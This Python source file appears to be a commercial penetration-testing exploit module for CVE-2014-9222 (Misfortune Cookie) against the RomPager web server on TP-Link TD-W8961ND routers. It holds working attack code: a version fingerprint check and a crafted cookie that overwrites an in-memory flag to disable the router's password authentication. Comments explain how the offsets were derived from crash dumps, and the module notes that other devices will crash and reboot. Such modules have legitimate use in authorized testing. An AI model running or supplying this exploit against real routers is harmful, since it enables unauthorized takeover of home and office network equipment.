#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from tcpexploit import tcpexploit
import libs.spkproxy as spkproxy #for urlopen

NAME                           = "CVE-2014-9222 (Misfortune Cookie)"
DESCRIPTION                    = "Misfortune Cookie for TP-Link TD-W8961ND"
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "Alegro"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["References"]    = ["http://mis.fortunecook.ie/"]
DOCUMENTATION["CVE Name"]      = "CVE-2014-9222"
DOCUMENTATION["CVE Url"]       = "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9222"
DOCUMENTATION['CVSS']          = 7.5
DOCUMENTATION['Notes']         ='''
This module exploits the arbitrary memory overwrite vulnerability in RomPager embedded web-server, which was originally introduced by CheckPoint.
Current version of the module and used offsets are calculated based on RomPager 5.04, running on TP-Link TD-W8961ND_V2_120427 firmware.
ZynOS provides a command in console "sys pswauthen" that can be used to temporarily disable authentication of web-based management interfaces.
This command sets a special flag in memory, which we overwrite with this exploit to enable/disable authentication.
Current version of the module does not support dynamic calculation of offset of the authentication flag, but knowing the model of target device, it would be easy to calculate it.

Using this exploit against different versions/devices that are vulnerable, WILL CAUSE CRASH AND REBOOT of the device.
'''
VERSION                        = "1.0"
PROPERTY                       = {}
PROPERTY['TYPE']               = "Web Exploits"
PROPERTY['SITE']               = "Remote"
PROPERTY['ARCH']               = [ ["ZynOS" ]]
PROPERTY['VERSION']            = [ "TD-W8961ND" ]

CHANGELOG="""

1.0 Initial version, static offsets for a single target.

"""

import urllib, time

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)        
        self.port               = 80
        self.host               = ""
      # self.badstring          = "\x00"
        self.setVersions()
        self.version            = 0
        self.done               = 0
        self.name               = NAME    
        self.basepath           = "/"
        self.user               = ""
        self.password           = ""
        self.basicauth_user     = ""
        self.basicauth_password = ""
        self.hostname           = None
        self.padding            = 25
        self.magicCookie_name   = "C107364732"       # offset calculated up on base addresses from TP-Link TD-W8961ND leaking c0+0x8000000
        self.magicCookie_val    = "a"*self.padding   # this will set the auth flag to zero, as the string terminator 0x00 is at the end of string, which will be overwritten on the flag offset.
        self.flagOffset         = "8052E0E9"
        #self.c0Offset           = ""                # this is calculated by c0+0x8000000


#How the vulnerability works?
    #We have write access to arbitrary memorry offsets related to the offset of cookies.
    #The cookie name (starting with "C") is used to calulate the overwrite address such that Cxx=yy where xx is multiplied by 40 (0x28) 
    #and sum the result with the base address of cookie in memory, and finally write this calculated offset to write yy into it.
    
#How this exploit works?
   #ZynOS provides a command in its console (sys paswauthen) which takes a variable [1/0] to disable or enable web-based password authentication.
   #This command sets a flag in memory at a static offset, which is checked by RomPager to enforce authentication or skip it altogether.
   #We exploit the above vulnerability to overwrite this flag with 0x00, which means disabling password authentication.
   #To be able to successfully overwrite this offset:
   
      #first we need to find it in ROM, which is easily done by staticly reversing the firmware.
      
      #We also need to know the base address of the cookie in memory. This one is tricky retrive by static analysis thus we use UART serial interface and firwmware builtin debug features to leak it.
      #The easiest approach is piggy backing same vulnerable code to leak the memmory offset of the cookie in a crash dump which is generated intentionally.
      #As we know (from reversing boot-loader) the base address is 0x8000000, we can feed the vulnerable code with c0+0x8000000 which will cause a core dump over serial console, 
      #because of trying to write to an invalid address. Prepared cookie would be "C053687091=/AAAA" for this check, which results in:
      
 #TP-LINK>
 #TLB refill exception occured!
 #EPC= 0x80336270
 #SR= 0x0000FF14
 #CR= 0x0000000C
 #$RA= 0x00000000
 #Bad Virtual Address = 0x0058A568                   <----------------------- In a normal crash dump, this value is 0x00000000, so we can conclude the c0 address from it. 
 #UTLB_TLBS ..\core\sys_isr.c:267 sysreset()
         #$r0= 0x00000000 $at= 0x80530000 $v0= 0x00000000 $v1= 0x00000001
         #$a0= 0x0000FF00 $a1= 0x8071FA38 $a2= 0xFFFFFFFF $a3= 0xFFFFFFFB
         #$t0= 0x8001FF80 $t1= 0x00000002 $t2= 0x00000030 $t3= 0x00000000
         #$t4= 0x805C4D84 $t5= 0x00000001 $t6= 0x00000002 $t7= 0x00000002
         #$s0= 0x8072AAD0 $s1= 0x805D9B40 $s2= 0x8072AA80 $s3= 0x0000FF00
         #$s4= 0x0000010B $s5= 0x8072AC38 $s6= 0x8072AC3C $s7= 0x00000000
         #$t8= 0x805DA7EC $t9= 0x805DAC58 $k0= 0x0058A568 $k1= 0x8000007C
         #$gp= 0x80535B18 $sp= 0x8072AA68 $fp= 0x8072AAD0 $ra= 0x80043A10
         
    #To confirm that, this time we try "C053687090=/AAAA" as cookie value, which should case the crash dump to point to 0x0058A568-40 . We use 40 because this is the valid length for a cookie based on reversed code.
    
#TP-LINK>
 #TLB refill exception occured!
 #EPC= 0x80336270
 #SR= 0x0000FF14
 #CR= 0x0000000C
 #$RA= 0x00000000
 #Bad Virtual Address = 0x0058A540    <--------------------------------------------
 #UTLB_TLBS ..\core\sys_isr.c:267 sysreset()
         #$r0= 0x00000000 $at= 0x80530000 $v0= 0x00000000 $v1= 0x00000001
         #$a0= 0x0000FF00 $a1= 0x8071FA38 $a2= 0xFFFFFFFF $a3= 0xFFFFFFFB
         #$t0= 0x8001FF80 $t1= 0x00000002 $t2= 0x00000030 $t3= 0x00000000
         #$t4= 0x805C4D84 $t5= 0x00000001 $t6= 0x00000002 $t7= 0x00000002
         #$s0= 0x8072AAD0 $s1= 0x805D9B40 $s2= 0x8072AA80 $s3= 0x0000FF00
         #$s4= 0x0000010B $s5= 0x8072AC38 $s6= 0x8072AC3C $s7= 0x00000000
         #$t8= 0x805DA7EC $t9= 0x805DAC58 $k0= 0x0058A540 $k1= 0x8000007C
         #$gp= 0x80535B18 $sp= 0x8072AA68 $fp= 0x8072AAD0 $ra= 0x80043A10
         
         
         #Having that confirmed, now we can calculate the correct offset (reletive to c0) for any offset we want, which in this case will be the authentication flag (at 0x8052E0E9)
         
        #>>> flag=0x8052E0E9        
        #c0= 0x0058A540 - 53687090*40
        #>>> (flag-c0 )/40
        #107364732
        #>>> (flag-c0 )%40
        #25
        
        #Which results in our magic cookie to be C107364732=aaaaaaaaaaaaaaaaaaaaaaaaa for clearing the flag.
        #To set the flag and enable authentication again, we simply add one more byte ("a"*26) to the cookie value.
         
  

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port",self.port))
        self.getarg("basepath") 
        #self.getarg("command")  # remove
        
        self.ssl = self.argsDict.get("ssl",self.ssl)
        
        self.getarg("user")
        self.getarg("password")
        self.getarg("basicauth_user")  
        self.getarg("basicauth_password")  
        self.getarg("hostname")
        
        if self.hostname in [None, ""]:
            allhosts = self.target.get_knowledge("www_hostnames")
            if allhosts == None:
                allhosts = ["%s"%self.host]
        else:
            allhosts = [self.hostname]
        self.allhosts = allhosts
    
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s" % (v,self.versions[v][0])

    def setVersions(self):
        self.versions = {}
        self.versions[1] = [""]
     
    def check(self):
        """
        Quicky banner check - looks for RomPager version.
        """
        self.getargs()
        self.log("Using basepath=%s"%self.basepath)
        self.log("Using vhost=%s"%self.hostname)
        if self.ssl:
            protocol="https"
        else:
            protocol="http"

        for hostname in self.allhosts:
            self.log("Testing hostname: %s"%hostname)

            self.log("Testing for RomPager version")
            #If we have to do basic-auth, let's get an object from spkproxy here
            if self.basicauth_user:
                auth=spkproxy.BasicAuth(self.basicauth_user,self.basicauth_password)
            else:
                auth=None 
                
            #setting up spkproxy
            fd=spkproxy.urlopen(protocol + "://" + self.host + ":%s" %self.port + "/Allegro", hostname=hostname, exploit=self, auth=auth)
            data=fd.read()
            #now that we have the web page - we parse it and look for vulnerable versions
            #versions below 4.34 are assumed vulnerable.
            for s in ["RomPager Advanced Version 4.07"]:
                if s in data:
                    self.log_info("Detected vulnerable and supported RomPager version on %s "%(hostname))
                    #self.argsDict["basepath"]=basepath
                    #self.basepath=basepath
                    self.hostname=hostname
                    self.version=1
                    #self.log_debug("Response:%s"%data)
                    return 1
                else:
                    for s in ["RomPager"]:
                        if s in data:
                            self.log_info("Unsupported version of RomPager was detected.")
                            self.log_debug("Response: %s"%data)
                            return 0
                        else:
                            self.log_info("Target is not running RomPager.")
                            #self.log_debug("Response: %s"%data)
                            return 0
        return 0
    
    def run(self):
        for node in self.argsDict['passednodes']:
            self.getargs()
            self.setInfo("%s attacking %s:%d (in progress)" % (NAME, self.host, self.port))
            self.log_info("Using version: %s" % self.version)
            ret = self.check()
            self.setProgress(30)       
            if not ret:
                self.setInfo("%s against %s:%d (failed: didn't find vulnerable target!)"%(NAME,self.host,self.port))
                self.log_info("Testing didn't find vulnerable target")
                return 0
    
            self.log_info("Attacking %s:%d"%(self.host,self.port))
            #self.log("Basic Auth User: %s"%self.basicauth_user)
            #self.log("VHost: %s"%self.hostname)
            if self.ssl:
                protocol="https"
            else:
                protocol="http"
    
            #If we have to do basic-auth, let's get an object from spkproxy here
            if self.basicauth_user:
                auth=spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)
            else:
                auth=None
            requestString= protocol + "://" + self.host + ":%s" % self.port + self.basepath
            self.log("RequestString: %s"%requestString)
            
            UA =spkproxy.UserAgent(requestString, auth=auth, hostname=self.hostname, exploit=self)
            
            
            UA.SetCookie(self.magicCookie_name,self.magicCookie_val)  # to clear the authentigation flag.
            self.log("Cookie: "+self.magicCookie_name+"="+self.magicCookie_val)
            self.setProgress(50)
            
            # To-do: Handle enable/disable separatedly
            #
            #UA.SetCookie(self.magicCookie_name,self.magicCookie_val+1) # to restore authentication flag.
            #self.log("Cookie: "+self.magicCookie_name+"="+self.magicCookie_val)
                                               
            data = UA.GET("")
            self.setProgress(70)
            if "status/status_deviceinfo" in data:
                self.log("Authentication successfully disabled!")
                self.log("You can now access web interface without password.")
                self.setProgress(100)
                ret=1
            else:
                if "Protected Object" in data:
                    self.log("Exploit did not work. Wrong offsets?")
                ret=0
            
            if ret :
                self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
            else:
                self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            return ret
        

    def shutdown(self):
        self.done=1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
